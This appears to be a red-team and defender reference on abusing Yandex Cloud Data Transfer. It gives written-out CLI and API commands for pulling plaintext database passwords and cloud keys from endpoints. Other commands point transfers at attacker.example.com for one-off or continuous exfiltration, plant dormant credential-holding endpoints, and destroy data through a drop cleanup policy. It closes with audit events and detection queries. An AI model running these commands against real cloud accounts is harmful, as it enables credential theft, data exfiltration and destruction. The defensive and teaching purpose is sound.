# Yandex Cloud - Data Transfer Techniques

## Service Overview

Yandex Cloud Data Transfer is a managed service for transferring data between databases, object storages, and message brokers. It supports PostgreSQL, MySQL, ClickHouse, MongoDB, Kafka, Elasticsearch, OpenSearch, YDB, YDS, Object Storage, S3-compatible buckets, Oracle, BigQuery, and AWS CloudTrail.

Key concepts:
- **Endpoints** define source/target connections including host, port, credentials, and data processing rules
- **Transfers** define the data movement between a source and target endpoint within the same folder
- **Workers** are VMs allocated to run transfers, with configurable vCPU and RAM
- Three transfer types: **Copy** (one-time snapshot), **Replication** (continuous streaming), **Copy and Replication** (snapshot then continuous)
- **Critical**: Endpoints store database credentials (passwords, AWS keys, Kafka tokens) as raw strings in their configuration — extractable via API with viewer-level access

---

## Enumeration

### Enumerate Endpoints

```bash
# List all endpoints in a folder
yc datatransfer endpoint list [--folder-id <FOLDER-ID>]

# Get detailed endpoint info (may expose connection credentials)
yc datatransfer endpoint get <ENDPOINT-ID>
```

### Enumerate Transfers

```bash
# List all transfers
yc datatransfer transfer list [--folder-id <FOLDER-ID>]

# Get transfer details (--full exposes source/target endpoint config)
yc datatransfer transfer get <TRANSFER-ID>
yc datatransfer transfer get <TRANSFER-ID> --full
```

### REST API Enumeration

```bash
# List endpoints via API
curl -s -H "Authorization: Bearer <IAM-TOKEN>" \
  "https://datatransfer.api.cloud.yandex.net/v1/endpoints/list/<FOLDER-ID>"

# Get endpoint details (includes credentials)
curl -s -H "Authorization: Bearer <IAM-TOKEN>" \
  "https://datatransfer.api.cloud.yandex.net/v1/endpoint/<ENDPOINT-ID>"
```

---

## Credential Access

### Extract Database Credentials from Endpoints

Endpoints store raw database credentials in their configuration. With `data-transfer.viewer` role, the API returns full endpoint settings including password fields:

```bash
# Get endpoint with credentials via CLI
yc datatransfer endpoint get <ENDPOINT-ID> --format json

# Look for password fields in the output:
# settings.postgresSource.password.raw
# settings.mysqlSource.password.raw
# settings.clickhouseSource.password.raw
# settings.mongoSource.password.raw
```

**Credential types stored in endpoints:**
- **Database passwords**: Stored as `Secret.raw` (plaintext) for PostgreSQL, MySQL, MongoDB, ClickHouse
- **Kafka SASL tokens**: Stored as `Secret.raw` in SASL auth configuration
- **AWS keys**: `aws_access_key_id` and `aws_secret_access_key` for S3-compatible targets
- **CA certificates**: Stored/referenced in TLS configuration

### Extract Credentials via Transfer Details

The `--full` flag on `transfer get` returns complete source and target endpoint configurations:

```bash
# Get transfer with full endpoint details including credentials
yc datatransfer transfer get <TRANSFER-ID> --full --format json
```

### Service Account Discovery

YDS, Object Storage, and YDB endpoints reference service accounts that may have broader permissions:

```bash
# Look for service_account_id fields in endpoint config
yc datatransfer endpoint get <ENDPOINT-ID> --format json | jq '.settings | .. | .service_account_id? // empty'
```

---

## Privilege Escalation

### Escalate from privateAdmin to admin for Internet Access

The key distinction between `data-transfer.privateAdmin` and `data-transfer.admin` is internet access. `privateAdmin` restricts transfers to Yandex Cloud internal networks, while `admin` enables internet-facing transfers — the critical boundary for exfiltration to external infrastructure.

### Cross-Folder Access via Managed Cluster References

Creating endpoints for managed database clusters in other folders only requires `viewer` on that folder:

```bash
# Create endpoint referencing a cluster in another folder
yc datatransfer endpoint create postgres-source cross-folder-source \
  --cluster-id <CLUSTER-ID-IN-OTHER-FOLDER> \
  --user <user> --raw-password <password> \
  --database <db>
```

---

## Lateral Movement

### Data Exfiltration via Transfer Pipeline

Create a target endpoint pointing to attacker infrastructure and a transfer to copy entire databases:

```bash
# Step 1: Create attacker-controlled target endpoint
yc datatransfer endpoint create postgres-target exfil-target \
  --host attacker.example.com --port 5432 \
  --database exfil --user attacker --raw-password <password>

# Step 2: Create transfer from production source to attacker target
yc datatransfer transfer create exfil-transfer \
  --source-id <PRODUCTION-SOURCE-ENDPOINT-ID> \
  --target-id <ATTACKER-TARGET-ENDPOINT-ID> \
  --type snapshot-only

# Step 3: Activate to begin data copy
yc datatransfer transfer activate <TRANSFER-ID>
```

### Redirect Existing Target Endpoint

Modify an existing target endpoint to redirect data to attacker infrastructure. Active transfers will begin sending data to the new target:

```bash
# Update existing target to point to attacker database
yc datatransfer endpoint update postgres-target <ENDPOINT-ID> \
  --host attacker.example.com --port 5432 \
  --database exfil --user attacker --raw-password <password>
```

### Object Storage Exfiltration

Create an Object Storage target endpoint to write data to an S3 bucket:

```bash
# Via console/API: Create Object Storage target endpoint
# Requires a service account with storage.uploader role
# Data gets written to an accessible S3 bucket
```

### Cross-Service Credential Pivoting

Use extracted database credentials to directly access managed databases, bypassing Data Transfer:

```bash
# Extract PostgreSQL credentials from endpoint
yc datatransfer endpoint get <ENDPOINT-ID> --format json

# Use extracted credentials to connect directly
psql -h <extracted-host> -U <extracted-user> -d <extracted-database>
```

---

## Persistence

### Replication-Based Persistent Exfiltration

Create a replication transfer for continuous data streaming to attacker infrastructure:

```bash
# Create continuous replication transfer
yc datatransfer transfer create persistent-exfil \
  --source-id <PRODUCTION-SOURCE-ID> \
  --target-id <ATTACKER-TARGET-ID> \
  --type increment-only

# Activate for continuous streaming
yc datatransfer transfer activate <TRANSFER-ID>
```

All changes to the production database are continuously streamed to the attacker's target.

### Hidden Endpoint for Future Access

Create endpoints with stored credentials for later use:

```bash
# Create a dormant source endpoint storing production credentials
yc datatransfer endpoint create postgres-source dormant-access \
  --host <production-host> --port 5432 \
  --database <production-db> --user <production-user> \
  --raw-password <production-password>
```

---

## Post-Exploitation

### Data Destruction via Cleanup Policy

Target endpoints support cleanup policies that can destroy data:

```bash
# Create target with DROP cleanup — destroys tables at target before transfer
yc datatransfer endpoint create postgres-target destructive \
  --host <target-host> --port 5432 \
  --database <target-db> --user <user> --raw-password <password> \
  --cleanup-policy drop
```

### Transfer Disruption

```bash
# Deactivate running transfers
yc datatransfer transfer deactivate <TRANSFER-ID>

# Delete transfers
yc datatransfer transfer delete <TRANSFER-ID>

# Delete endpoints
yc datatransfer endpoint delete <ENDPOINT-ID>
```

### Data Transformation Abuse

Data Transfer supports transformations that can be used to manipulate data in transit:
- **Data masking**: Apply HMAC(sha256) hashing to specific columns — corrupts data at target
- **Column filter**: Exclude critical columns from transfer
- **Table renaming**: Rename tables to confuse applications
- **Primary key replacement**: Change primary keys to break referential integrity

---

## Key IAM Roles

| Role | Capabilities |
|---|---|
| `data-transfer.auditor` | View service metadata only (folder info, quotas) |
| `data-transfer.viewer` | View full endpoint and transfer details — **may expose stored credentials** |
| `data-transfer.privateAdmin` | Viewer + create/modify/delete/activate transfers within Yandex Cloud networks |
| `data-transfer.admin` | privateAdmin + transfers over the **internet** — required for external exfiltration |

Additional required roles:
- `vpc.user` — needed for specifying subnets in endpoint settings
- `ydb.viewer` — needed to create/edit YDB endpoints

---

## Detection and Logging

### Audit Trail Events

Source: `yandex.cloud.audit.datatransfer.*`

| Event | Description | Security Relevance |
|---|---|---|
| `CreateEndpoint` | Creating an endpoint | Attacker creating exfiltration target |
| `UpdateEndpoint` | Updating an endpoint | **Redirecting existing endpoint to attacker** |
| `DeleteEndpoint` | Deleting an endpoint | Covering tracks |
| `CreateTransfer` | Creating a transfer | **Creating exfiltration pipeline** |
| `UpdateTransfer` | Updating a transfer | Modifying transfer configuration |
| `ActivateTransfer` | Activating a transfer | **Starting data exfiltration** |
| `DeactivateTransfer` | Deactivating a transfer | Stopping data flow |
| `DeleteTransfer` | Deleting a transfer | Covering tracks |
| `RestartTransfer` | Restarting a transfer | Re-triggering data copy |
| `FreezeTransferVersion` | Committing data plane version | Version pinning |
| `UnfreezeTransferVersion` | Enabling version updates | Version management |
| `UpdateTransferVersion` | Updating data plane version | Version management |

### Critical Detection Gaps

- **Read operations are NOT logged**: `GetEndpoint`, `ListEndpoints`, `GetTransfer`, `ListTransfers` do NOT generate audit events — credential extraction via API is invisible
- **No data plane logging**: Actual data flowing through transfers is not logged in audit trails
- **Transfer activation is logged but not data volume**: You can see that a transfer was activated but not how much data was transferred

### Detection Queries

**Detect exfiltration pipeline creation**:
```
event_type IN ("CreateEndpoint", "CreateTransfer", "ActivateTransfer")
-- Correlate: new endpoint + new transfer + activation in quick succession
```

**Detect endpoint credential theft (indirect)**:
```
-- Cannot detect directly (reads are not logged)
-- Monitor for: new transfers using existing source endpoints
event_type = "CreateTransfer"
-- Alert when source_id matches a production endpoint
```

**Detect endpoint redirection**:
```
event_type = "UpdateEndpoint"
-- Alert on any modification to target endpoint connection settings
```

---

## References

- Data Transfer Concepts: `en/data-transfer/concepts/index.md`
- Transfer Lifecycle: `en/data-transfer/concepts/transfer-lifecycle.md`
- Data Transformation: `en/data-transfer/concepts/data-transformation.md`
- Networking: `en/data-transfer/concepts/network.md`
- Security: `en/data-transfer/security/index.md`
- CLI Reference: `en/cli/cli-ref/datatransfer/cli-ref/`
- REST API: `en/data-transfer/api-ref/`
- gRPC API: `en/data-transfer/api-ref/grpc/`
- Audit Events: `en/_includes/audit-trails/events/datatransfer-events.md`
